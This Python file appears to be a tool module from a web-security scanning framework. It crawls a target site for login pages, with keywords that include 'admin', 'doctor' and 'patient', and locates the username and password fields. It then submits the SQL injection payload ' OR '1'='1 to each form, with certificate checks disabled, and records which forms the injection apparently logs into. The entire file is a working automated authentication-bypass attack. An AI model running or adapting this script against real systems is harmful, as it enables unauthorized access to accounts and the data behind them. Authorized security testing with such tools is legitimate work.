from __future__ import annotations

import json
import sys
from urllib.parse import urlparse

import httpx

from app.adapters.tools.web_common import (
    extract_forms,
    extract_links,
    prioritize_links,
    response_indicates_success_delta,
    select_form_fields,
    snapshot_response,
)
from app.core.targeting import parse_target

HTTP_TIMEOUT_SECONDS = 4.0
MAX_LINKS = 8
MAX_FORMS = 5
LOGIN_KEYWORDS = ("login", "admin", "doctor", "patient", "signin", "account")
USERNAME_FIELD_MARKERS = ("login", "user", "email", "name", "adminid", "doctorid", "patientid")
PASSWORD_FIELD_MARKERS = ("pass", "password", "pwd")
SUCCESS_MARKERS = (
    "window.location",
    "location.href",
    "location='",
    'location="',
    "account.php",
    "dashboard",
    "welcome",
)
FAILURE_MARKERS = (
    "alert-danger",
    "invalid",
    "incorrect",
    "wrong",
    "try submitting again",
    "failed",
)
SQLI_PAYLOAD = "' OR '1'='1"


def _build_form_data(form: dict[str, object], *, injected: bool) -> dict[str, str]:
    username_field = str(form["username_field"])
    password_field = str(form["password_field"])
    if injected:
        return {
            username_field: SQLI_PAYLOAD,
            password_field: SQLI_PAYLOAD,
            "submit": "Login",
        }
    return {
        username_field: "codex-test-user",
        password_field: "WrongPass123!",
        "submit": "Login",
    }


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(json.dumps({"error": "target argument is required"}))
        return 1

    target = argv[1]
    profile = parse_target(target)
    base_url = profile.base_url

    payload: dict[str, object] = {
        "base_url": base_url,
        "links": [],
        "forms": [],
        "confirmed": [],
    }

    try:
        with httpx.Client(
            timeout=HTTP_TIMEOUT_SECONDS,
            follow_redirects=True,
            verify=False,
            trust_env=False,
        ) as client:
            root_response = client.get(base_url)
            root_links = extract_links(base_url, root_response.text)
            candidate_links = prioritize_links(
                base_url,
                root_links,
                keywords=LOGIN_KEYWORDS,
                max_links=MAX_LINKS,
            )
            payload["links"] = [urlparse(link).path or "/" for link in candidate_links]

            forms: list[dict[str, object]] = []
            for link in candidate_links:
                response = client.get(link)
                for form in extract_forms(str(response.request.url), response.text, max_forms=MAX_FORMS):
                    username_field, password_field = select_form_fields(
                        form.get("fields", []),
                        username_markers=USERNAME_FIELD_MARKERS,
                        password_markers=PASSWORD_FIELD_MARKERS,
                    )
                    if not username_field or not password_field:
                        continue
                    forms.append(
                        {
                            "page_url": form["page_url"],
                            "action": form["action"],
                            "method": "POST" if form["method"] == "GET" else form["method"],
                            "username_field": username_field,
                            "password_field": password_field,
                        }
                    )
            payload["forms"] = forms

            confirmed: list[dict[str, object]] = []
            for form in forms[:MAX_FORMS]:
                baseline = client.request(
                    str(form["method"]),
                    str(form["action"]),
                    data=_build_form_data(form, injected=False),
                )
                injected = client.request(
                    str(form["method"]),
                    str(form["action"]),
                    data=_build_form_data(form, injected=True),
                )
                if response_indicates_success_delta(
                    snapshot_response(baseline),
                    snapshot_response(injected),
                    success_markers=SUCCESS_MARKERS,
                    failure_markers=FAILURE_MARKERS,
                ):
                    confirmed.append(
                        {
                            "page": urlparse(str(form["page_url"])).path or "/",
                            "action": urlparse(str(form["action"])).path or "/",
                            "username_field": form["username_field"],
                            "password_field": form["password_field"],
                            "baseline_status": baseline.status_code,
                            "injected_status": injected.status_code,
                            "success_hint": "window.location" if "window.location" in injected.text.lower() else "response-delta",
                        }
                    )
            payload["confirmed"] = confirmed
    except Exception as exc:
        payload["error"] = str(exc)
        print(json.dumps(payload, ensure_ascii=False))
        return 1

    print(json.dumps(payload, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
